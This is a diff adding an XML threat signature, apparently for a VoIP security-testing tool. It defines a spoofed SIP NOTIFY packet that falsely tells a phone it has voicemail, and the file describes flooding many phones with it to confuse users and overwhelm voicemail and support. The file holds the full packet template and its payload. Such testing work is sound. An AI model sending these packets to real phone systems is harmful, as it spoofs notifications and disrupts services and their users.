@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="SIP Voicemail Alert"/>
+    <EngDesc display="true" value="This threat sends out a SIP message to a phone informing it that it has voicemail. Sending this threat to a large number of phones at once can confuse many users and overwhelm both the voicemail system and tech support."/>
+    <Intent display="true">
+      <item value="Implementation_Exploitation"/>
+    </Intent>
+    <Protocol display="true" value="SIP"/>
+    <Type_Of_Equipment display="true">
+      <item value="VoIP_Equipment"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="beSTORM"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="00000109c8cedafd00c000a80001003c1e970520"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="1.8"/>
+    <Suite display="true" value="VoIP"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value=""/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633198427160312500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1184260850" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="pbxIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="SIPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="destExt" type="ImperfectControls.MultiLine" value="null" index="G"/>
+    <NamedVar name="phoneIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="SIPCallID" type="ImperfectControls.MultiLine" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="D"/>
+      <for index="G"/>
+      <for index="I"/>
+      <for index="K"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="5" TypeofService="0" TotalLength="" Identification="@random(0000,FFFF)" FragmentOffset="" TTL="40" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$pbxIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="$SIPdestPort" destPort="$SIPdestPort" checksum="" length="">
+          <SIP_Notify Method="NOTIFY" Request-URI="sip:$destExt\@$pbxIP" SIP-Version="SIP/2.0" ViaVersion="SIP/2.0/UDP" ViaAddress="$pbxIP" ViaPort="$SIPdestPort" BranchTagCookie="z9hG4bK" BranchTagRest="@randstring(8)" FromName="@randstring(8)" From-URI="sip:$destExt\@$pbxIP" Tag="@randstring(8)" ToName="@randstring(8)" To-URI="sip:$destExt\@$pbxIP" ContactName="@randstring(8)" Contact-URI="sip:$destExt\@$phoneIP" CallID="$SIPCallID" CallIDAddress="$phoneIP" CSeqNum="42" CSeqMeth="NOTIFY" Event="message-summary" MaxForwards="70" ContentType="application/simple-message-summary" UserAgent="@randstring(32)" AdditionalHeaders="" ContentLength="37" Payload="4D657373616765732D57616974696E673A207965730D0A566F6963656D61696C3A20332F32"/>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Stateful display="false" value="false"/>
+  <DestIPVarName display="false" value="$pbxIP"/>
+</threatSignature>
